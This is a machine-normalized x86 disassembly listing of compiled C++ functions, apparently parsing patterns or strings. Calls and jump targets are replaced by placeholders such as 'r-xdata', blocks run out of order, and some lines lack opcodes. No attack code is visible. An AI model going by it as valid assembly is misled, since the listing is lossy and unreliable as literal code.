mov [ ebp - 0x4 ] 0x15
call sub_4152ff
pop ecx
pop ecx
mov ebx eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x16
call sub_406dc4
lea eax [ ebp - 0xe0 ]
push eax
mov [ ebp - 0x4 ] 0x15
call sub_4069e4
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x70 ]
jmp r-xdata
mov eax [ ebp - 0xa4 ]
mov ecx [ ebp - 0x5c ]
mov [ ecx + 0x210 ] eax
mov eax [ ebp - 0x58 ]
lea ecx [ ebp - 0x9c ]
call sub_40b872
lea esi [ eax + 0x4 ]
jmp r-xdata
sub ecx 0x5b
je r-xdata
je r-xdata
sub eax 0x5b
je r-xdata
je r-xdata
push [ ebp - 0x54 ]
mov edi [ ebp - 0x64 ]
push [ ebp - 0x7c ]
call sub_40d1fb
mov edi [ ebp - 0x54 ]
mov esi [ ebp - 0x64 ]
cmp [ eax ] edi
jne r-xdata
jmp r-xdata
push ebx
jmp r-xdata
mov edx [ ebp - 0x64 ]
mov eax [ edx ]
movsx ecx [ eax ]
cmp ecx 0x3f
jg r-xdata
lea eax [ ebp - 0xc4 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_4069e4
lea eax [ ebp - 0x9c ]
push eax
mov [ ebp - 0x4 ] bl
call sub_4069e4
push 0x0
jmp r-xdata
call sub_40379c
jmp r-xdata
mov edx [ ebp - 0x64 ]
mov eax [ edx ]
movsx ecx [ eax ]
cmp ecx 0x3f
jg r-xdata
push eax
mov [ ebp - 0x4 ] 0x5
call sub_4069e4
push 0x183
push r--data
push r--data
push r--data
push 0xe
push [ ebp - 0x1c ]
push eax
mov eax [ edx + 0x10 ]
call sub_404814
test eax eax
setne al
movzx eax al
push eax
call sub_403978
add [ ebp - 0xa0 ] 0x20
add esp 0x18
inc [ ebp - 0x78 ]
call sub_406b2e
mov ecx [ eax + ebx + 0x4 ]
sub ecx [ eax + ebx ]
sar ecx 0x5
cmp [ ebp - 0x78 ] ecx
jb r-xdata
lea eax [ ebp - 0x2c ]
push 0xe
mov eax r--data
lea esi [ ebp - 0x194 ]
call sub_4038f9
mov [ ebp - 0x4 ] 0xd
push 0x19c
jmp r-xdata
and [ ebp - 0x68 ] edi
mov edx [ ebp - 0x64 ]
mov eax [ edx ]
movsx ecx [ eax ]
cmp ecx 0x3f
jg r-xdata
push [ ebp - 0x9c ]
lea esi [ ebp - 0xe0 ]
call sub_415275
pop ecx
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x17
call sub_406cd3
mov eax esi
push eax
mov [ ebp - 0x4 ] 0x5
call sub_4069e4
mov ecx [ ebp - 0x90 ]
mov al [ ebp - 0x9c ]
mov edi ecx
mov [ ebp - 0x6c ] edi
test ecx ecx
je r-xdata
test eax eax
je r-xdata
call sub_40c2c3
inc eax
mov [ edx ] eax
push 0x7
dec ecx
je r-xdata
cmp ecx 0x24
je r-xdata
inc [ ebp - 0x50 ]
push 0x7
dec eax
je r-xdata
cmp eax 0x24
je r-xdata
mov eax [ esi ]
movsx ecx [ eax ]
cmp ecx 0x3f
jg r-xdata
push 0x2f
jmp r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_40487c
mov eax [ ebp - 0x58 ]
call sub_448681
retn 0xc
sub ecx 0x5b
je r-xdata
je r-xdata
sub ecx 0x5b
je r-xdata
je r-xdata
mov esi [ ebp - 0x68 ]
call sub_406b2e
mov edx [ eax + ebx ]
add edx [ ebp - 0xa0 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push r--data
push r--data
push eax
call sub_405e22
push [ ebp - 0x1c ]
push eax
mov eax [ edx + 0x10 ]
call sub_404814
test eax eax
je r-xdata
lea eax [ ebp - 0x2c ]
sub ecx 0x5b
je r-xdata
je r-xdata
mov [ ebp - 0x68 ] al
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
mov [ ebp - 0x4 ] 0x18
call sub_415369
pop ecx
pop ecx
mov ebx eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x19
call sub_406dc4
lea eax [ ebp - 0xe0 ]
push eax
mov [ ebp - 0x4 ] 0x18
call sub_4069e4
mov [ ebp - 0x4 ] 0x5
test edi edi
je r-xdata
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
mov al 0x1
jmp r-xdata
inc eax
mov [ edx ] eax
cmp eax esi
je r-xdata
dec ecx
dec ecx
je r-xdata
inc eax
mov [ edx ] eax
cmp ecx 0x28
je r-xdata
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x50 ]
push [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x5c ]
push eax
call sub_410e55
lea eax [ ebp - 0xc4 ]
push eax
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x4 ] 0x3
call sub_4069e4
lea eax [ ebp - 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_4069e4
push esi
inc [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
cmp eax ecx
je r-xdata
dec eax
dec eax
je r-xdata
inc [ ebp - 0x50 ]
jmp r-xdata
cmp eax 0x28
je r-xdata
sub ecx 0x5b
je r-xdata
je r-xdata
pop eax
inc eax
mov [ edx ] eax
push 0x7
dec ecx
je r-xdata
cmp ecx 0x24
je r-xdata
inc eax
mov [ edx ] eax
push 0x7
dec ecx
je r-xdata
cmp ecx 0x24
je r-xdata
call sub_406b2e
mov eax [ eax + ebx ]
mov esi [ ebp - 0x58 ]
shl edi 0x5
mov edi [ edi + eax + 0x1c ]
mov eax [ ebp - 0x5c ]
push [ eax + 0x210 ]
mov eax edi
call sub_412b99
pop ecx
jmp r-xdata
add [ ebp - 0x68 ] 0x20
inc edi
call sub_406b2e
mov ecx [ eax + ebx + 0x4 ]
sub ecx [ eax + ebx ]
sar ecx 0x5
cmp edi ecx
jb r-xdata
inc eax
mov [ edx ] eax
push 0x7
dec ecx
je r-xdata
cmp ecx 0x24
je r-xdata
lea esi [ edi + 0x4 ]
push 0x1ae
push r--data
push r--data
push r--data
push 0x5
push eax
call sub_403978
add esp 0x18
cmp [ ebp - 0x5f ] 0x0
je r-xdata
push 0x2
jmp r-xdata
call sub_40d26c
jmp r-xdata
sub ecx 0x1e
jmp r-xdata
cmp ecx 0x29
je r-xdata
push 0x2
jmp r-xdata
lea edx [ ebp - 0x50 ]
call sub_40d26c
jmp r-xdata
sub eax 0x1e
jmp r-xdata
cmp eax 0x29
je r-xdata
push 0x7
dec ecx
je r-xdata
push 0x6
jmp r-xdata
cmp ecx 0x24
je r-xdata
inc [ esi ]
dec eax
dec eax
je r-xdata
mov al 0x1
jmp r-xdata
inc eax
mov [ edx ] eax
cmp eax esi
je r-xdata
dec ecx
dec ecx
je r-xdata
inc eax
mov [ edx ] eax
cmp ecx 0x28
je r-xdata
mov al 0x1
jmp r-xdata
inc eax
mov [ edx ] eax
cmp eax esi
je r-xdata
dec ecx
dec ecx
je r-xdata
inc eax
mov [ edx ] eax
cmp ecx 0x28
je r-xdata
xor esi esi
lea eax [ ebp - 0xc4 ]
inc esi
push eax
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x4 ] 0x3
call sub_4069e4
lea eax [ ebp - 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_4069e4
push 0x0
push esi
call sub_406b2e
mov edx [ eax + ebx ]
add edx [ ebp - 0x68 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov al 0x1
jmp r-xdata
inc eax
mov [ edx ] eax
cmp eax esi
je r-xdata
dec ecx
dec ecx
je r-xdata
inc eax
mov [ edx ] eax
cmp ecx 0x28
je r-xdata
pop eax
cmp eax 0x4
jne r-xdata
jne r-xdata
inc eax
mov [ edx ] eax
jmp r-xdata
jle r-xdata
pop eax
cmp eax 0x4
jne r-xdata
jne r-xdata
inc [ ebp - 0x50 ]
jmp r-xdata
jle r-xdata
inc eax
mov [ esi ] eax
cmp eax edi
je r-xdata
dec ecx
dec ecx
je r-xdata
push 0x23
jmp r-xdata
cmp ecx 0x28
je r-xdata
cmp [ esi ] edi
push 0x15a
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x2
push eax
call sub_403978
add esp 0x18
dec eax
dec eax
jne r-xdata
push 0x167
push r--data
push r--data
push r--data
push 0x5
push eax
call sub_403978
mov ebx [ ebp - 0x5c ]
add esp 0x18
add ebx 0x21c
lea esi [ ebp - 0xec ]
call sub_414482
push eax
mov [ ebp - 0x4 ] 0x6
push [ ebp - 0x58 ]
call sub_4151f8
xor ebx ebx
pop ecx
inc ebx
pop ecx
lea eax [ ebp - 0xe8 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x4 ] 0x5
call sub_403855
push 0x2
jmp r-xdata
call sub_40d26c
jmp r-xdata
sub ecx 0x1e
jmp r-xdata
cmp ecx 0x29
je r-xdata
push 0x178
push r--data
push r--data
push r--data
push 0x5
push eax
call sub_403978
mov edi [ ebp - 0x5c ]
add esp 0x18
add edi 0x224
lea ebx [ ebp - 0x2c ]
call sub_406b96
push eax
call sub_406fab
mov ecx eax
lea eax [ ebp - 0xa8 ]
call sub_407102
lea esi [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0x8
call sub_406b0f
mov esi [ ebp - 0x5c ]
add esi 0x21c
mov edi eax
call sub_406b2e
push eax
mov eax edi
call sub_407665
lea ebx [ ebp - 0xa8 ]
lea esi [ ebp - 0xf8 ]
call sub_414482
push eax
mov [ ebp - 0x4 ] 0x9
push [ ebp - 0x58 ]
call sub_4151f8
pop ecx
xor ebx ebx
inc ebx
pop ecx
lea eax [ ebp - 0xf4 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x4 ] 0x8
call sub_403855
mov [ ebp - 0x4 ] 0x5
mov esi [ ebp - 0xa4 ]
test esi esi
je r-xdata
push 0x2
jmp r-xdata
call sub_40d26c
jmp r-xdata
sub ecx 0x1e
jmp r-xdata
cmp ecx 0x29
je r-xdata
push 0x190
push r--data
push r--data
push r--data
push 0x5
push eax
call sub_403978
mov esi [ ebp - 0x5c ]
add esp 0x18
add esi 0x21c
xor edi edi
call sub_406b2e
push 0x38
pop ebx
mov ecx [ eax + ebx + 0x4 ]
sub ecx [ eax + ebx ]
sar ecx 0x5
test ecx ecx
je r-xdata
push 0x2
jmp r-xdata
call sub_40d26c
jmp r-xdata
sub ecx 0x1e
jmp r-xdata
cmp ecx 0x29
je r-xdata
cmp ecx 0x2b
jle r-xdata
cmp eax 0x2b
jle r-xdata
push 0x2
jmp r-xdata
mov edx esi
call sub_40d26c
jmp r-xdata
push 0x22
jmp r-xdata
sub ecx 0x1e
je r-xdata
inc eax
mov [ esi ] eax
push 0x3
jmp r-xdata
cmp ecx 0x29
je r-xdata
cmp [ esi ] edi
mov edx [ ebp - 0x58 ]
mov ecx [ ebp - 0x5c ]
push edi
push esi
call sub_410e55
jmp r-xdata
pop eax
cmp eax 0x4
jne r-xdata
jne r-xdata
inc eax
mov [ edx ] eax
jmp r-xdata
jle r-xdata
pop eax
cmp eax 0x4
jne r-xdata
jne r-xdata
inc eax
mov [ edx ] eax
jmp r-xdata
jle r-xdata
pop eax
cmp eax 0x4
jne r-xdata
jne r-xdata
inc eax
mov [ edx ] eax
jmp r-xdata
jle r-xdata
cmp ecx 0x2e
cmp eax 0x2e
sub eax 0x0
je r-xdata
push 0x5
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
jle r-xdata
cmp ecx 0x2b
jle r-xdata
cmp ecx 0x2b
jle r-xdata
cmp ecx 0x2b
jle r-xdata
cmp ecx 0x2b
jle r-xdata
cmp ecx 0x2e
cmp ecx 0x2e
cmp ecx 0x2e
cmp ecx 0x2e
jne r-xdata
inc eax
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
sub_413830
push 0x48
mov eax sub_44e1c6
call sub_4485fe
mov eax [ ebp + 0x8 ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x48 ]
mov esi ecx
call sub_414568
mov edx [ ebp + 0x10 ]
mov ecx [ ebp - 0x50 ]
lea ebx [ esi + 0x8 ]
xor edi edi
lea eax [ ebp - 0x48 ]
push ebx
inc edi
push eax
mov [ ebp - 0x4 ] edi
call sub_4153d2
push [ esi + 0x210 ]
mov ecx [ ebp - 0x4c ]
push ebx
lea edx [ ebp - 0x48 ]
call sub_4158ab
add esp 0x10
lea esi [ ebp - 0x24 ]
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x4 ] 0x0
call sub_41472b
mov eax [ ebp - 0x4c ]
call sub_448681
retn 0xc
sub_41389e
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push edi
mov edi eax
mov eax [ edi ]
mov esi eax
mov [ ebp - 0x4 ] eax
cmp ebx esi
je r-xdata
mov eax [ edi ]
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp + 0x8 ] eax
mov eax [ edi ]
movsx ecx [ eax ]
cmp ecx 0x3f
jg r-xdata
push 0x2f
jmp r-xdata
sub ecx 0x5b
je r-xdata
je r-xdata
pop eax
push 0x7
dec ecx
je r-xdata
push 0x6
jmp r-xdata
cmp ecx 0x24
je r-xdata
inc [ edi ]
dec eax
dec eax
je r-xdata
inc eax
mov [ edi ] eax
cmp eax ebx
je r-xdata
dec ecx
dec ecx
je r-xdata
push 0x23
jmp r-xdata
cmp ecx 0x28
je r-xdata
push ebx
push [ ebp + 0x8 ]
call sub_40d1fb
cmp [ eax ] ebx
jne r-xdata
cmp [ edi ] ebx
push 0x2b4
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x2
push eax
call sub_403978
add esp 0x18
sub eax 0x4
je r-xdata
push 0x2
jmp r-xdata
mov edx edi
call sub_40d26c
jmp r-xdata
push 0x22
jmp r-xdata
sub ecx 0x1e
je r-xdata
inc eax
mov [ edi ] eax
push 0x3
jmp r-xdata
cmp ecx 0x29
je r-xdata
sub eax 0xd
jne r-xdata
sub eax 0x0
je r-xdata
push 0x5
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
jle r-xdata
mov esi [ edi ]
cmp ebx esi
jne r-xdata
mov eax esi
jmp r-xdata
cmp ecx 0x2b
jle r-xdata
push [ ebp - 0x4 ]
mov esi [ ebp + 0xc ]
call sub_414039
pop edi
mov eax esi
pop esi
leave
retn 0x8
cmp ecx 0x2e
jne r-xdata
inc eax
mov [ edi ] eax
xor eax eax
inc eax
jmp r-xdata
sub_4139a9
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
and [ esp ] 0x0
push edi
mov edi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi ]
movzx eax [ eax ]
push eax
push [ ebp + 0x8 ]
call sub_406e7c
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
imul ecx edi
add eax ecx
mov [ esp + 0x4 ] eax
cmp [ ebp + 0xc ] eax
jl r-xdata
cdq
idiv edi
jmp r-xdata
inc [ esi ]
pop edi
mov esp ebp
pop ebp
retn
sub_413a67
push 0x0
mov eax sub_44b11c
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x0
call sub_414137
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_414137
add eax 0x10
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_413ade
push 0x0
mov eax sub_44b0f6
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x0
call sub_414156
mov [ edi + 0x4 ] 0x3ffffffe
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_414156
add eax 0x10
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_413b85
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_418ece
pop ecx
pop ecx
xor ecx ecx
cmp [ ebp + 0xc ] eax
setne al
pop ebp
retn
sub_413ba2
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
sub esp 0xc
mov edi esp
push [ ebp + 0x10 ]
lea esi [ ebp + 0x14 ]
push [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_415a28
mov eax [ ebp + 0x8 ]
add esp 0x14
pop edi
pop esi
pop ebp
retn
sub_413bd8
push 0x8
mov eax sub_44d249
call sub_4485c8
mov edi ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
call sub_44866d
retn
push [ ebp + 0xc ]
call sub_40fd17
add [ ebp + 0xc ] 0x20
add edi 0x20
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_413c06
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0xc ]
jne r-xdata
push 0x1
mov ecx esi
call sub_40487c
add esi 0x20
push 0x0
call sub_426f77
mov eax [ ebp + 0xc ]
call sub_44866d
retn
sub_413c31
push ebp
mov ebp esp
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x204 ]
mov eax [ ecx ]
push edi
push [ ebp + 0x8 ]
call [ eax + 0x8 ]
movzx eax al
lea edi [ esi + 0x8 ]
call sub_411fdc
pop edi
pop ebp
retn 0xc
push 0x8f
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_413c72
push ebp
mov ebp esp
cmp [ esi ] 0x0
je r-xdata
movzx eax [ ebp + 0x8 ]
push edi
lea edi [ esi + 0x8 ]
call sub_411fdc
pop edi
pop ebp
retn 0x8
push 0x88
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_413ca3
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi eax
mov ebx [ esi + 0xc ]
mov eax [ edi ]
xor edx edx
neg ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
cmp [ esi + 0x8 ] edx
jbe r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
je r-xdata
cmp [ esi + 0x4 ] edx
ja r-xdata
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jb r-xdata
mov [ edi ] eax
xor al al
jmp r-xdata
cmp eax [ edi + 0x10 ]
jne r-xdata
cmp edx [ esi + 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0xc ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ edi + 0x4c ] ecx
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x4 ]
add [ edi ] ebx
pop esi
pop ebx
leave
retn 0x8
sub_413d40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4 ] 0x0
mov ebx [ edi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
jne r-xdata
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jae r-xdata
xor al al
mov [ edi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x4 ]
jb r-xdata
pop esi
pop ebx
leave
retn 0x8
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
jne r-xdata
sub_413dcd
push ebp
mov ebp esp
push esi
mov esi [ edi ]
imul esi esi 0x18
add esi [ ebx + 0x4 ]
mov eax [ esi + 0xc ]
cmp [ edi + 0x8 ] eax
jbe r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
inc eax
mov [ esi + 0xc ] eax
mov ecx [ edi + 0xc ]
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ esi + 0xc ]
mov esi [ esi + 0xc ]
cmp esi [ edi + 0x4 ]
jae r-xdata
mov al 0x1
jmp r-xdata
xor al al
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_413e13
mov eax [ edi + 0x4 ]
push esi
mov esi [ edi ]
imul esi esi 0x18
add esi [ ebx + 0x4 ]
cmp eax [ esi + 0xc ]
ja r-xdata
mov eax [ esi + 0xc ]
cmp [ edi + 0x8 ] eax
jbe r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
je r-xdata
xor al al
inc eax
mov [ esi + 0xc ] eax
mov ecx [ edi + 0xc ]
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
dec [ esi + 0xc ]
pop esi
retn 0x4
sub_413e54
push ebp
mov ebp esp
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
test al al
jne r-xdata
xor eax eax
inc eax
push [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x4 ]
test al al
jne r-xdata
xor eax eax
jmp r-xdata
pop ebp
retn 0x8
sub_413eaa
push ebp
mov ebp esp
sub eax [ ebp + 0x8 ]
push esi
sar eax 0x2
mov esi eax
shl esi 0x2
push esi
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_424b60
add esp 0xc
add eax esi
pop esi
pop ebp
retn
sub_413ee7
push 0x8
mov eax sub_44d22e
call sub_448595
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
call sub_44866d
retn
push edi
call sub_404720
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
sub_413f27
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_415a8e
pop edi
leave
retn 0xc
sub_413f48
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
call sub_410ca9
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
pop ebp
retn 0x8
sub_413f7b
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_415ac5
pop edi
leave
retn 0x8
sub_413f99
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
call sub_410ca9
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
pop ebp
retn 0x8
sub_414039
push ebp
mov ebp esp
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi ] 0x0
cmp [ ebp + 0x8 ] eax
je r-xdata
mov eax esi
pop ebp
retn 0x4
sub eax [ ebp + 0x8 ]
mov ecx esi
push eax
push [ ebp + 0x8 ]
call sub_404ea8
sub_414063
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ esi + 0x14 ] 0x10
push edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
sub eax ecx
mov edi eax
xor edi edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
add esi edi
pop edi
mov [ ebx ] esi
mov eax ebx
pop esi
pop ebp
retn 0x4
mov esi [ esi ]
push 0x1
push edi
mov ecx esi
call sub_4053a7
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_4140c6
push 0x0
mov eax sub_44c31e
call sub_448595
mov esi ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
call sub_404720
mov eax [ ebp + 0x24 ]
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x1c ] eax
call sub_40487c
mov eax esi
call sub_44866d
retn 0x20
sub_414175
push 0x0
mov eax sub_44c2fb
call sub_448595
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_404720
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x14 ]
and [ esi + 0x1c ] 0x0
cmp eax 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp ebx edi
jne r-xdata
mov edi [ esi + 0x10 ]
add edi eax
jmp r-xdata
mov al [ ebx ]
mov [ ebp + 0xc ] al
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x204 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebx ] al
inc ebx
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax esi
call sub_44866d
retn 0xc
sub_4141e5
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi eax
call sub_404720
mov eax [ esi + 0x14 ]
and [ esi + 0x1c ] 0x0
cmp eax 0x10
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp edx eax
jne r-xdata
mov eax [ esi + 0x10 ]
add eax ecx
jmp r-xdata
inc edx
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41424a
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4142ee
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_414482
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov ecx ebx
mov eax esi
call sub_40d76d
mov eax [ ebx ]
mov [ esi + 0x8 ] eax
pop edi
test eax eax
jne r-xdata
mov eax esi
leave
retn
push 0x30
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4144bb
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
mov cl [ ebp + 0x8 ]
mov [ eax + 0x4 ] cl
mov cl [ ebp + 0xc ]
mov [ eax + 0x5 ] cl
pop ebp
retn 0x8
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4144e0
push 0x0
mov eax sub_44c2d8
call sub_448595
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ esi ] eax
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov al [ ebp + 0x10 ]
push 0x2b
mov [ esi + 0x4 ] al
mov al [ ebp + 0x14 ]
push r--data
mov [ esi + 0x5 ] al
cmp ecx 0x3ffffffe
push r--data
setne al
push r--data
movzx eax al
push 0xf
push eax
mov [ esi + 0x8 ] ecx
call sub_403978
add esp 0x18
mov eax esi
call sub_44866d
retn 0x10
xor edx edx
add eax 0x4
inc edx
[ eax ] edx
sub_414549
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
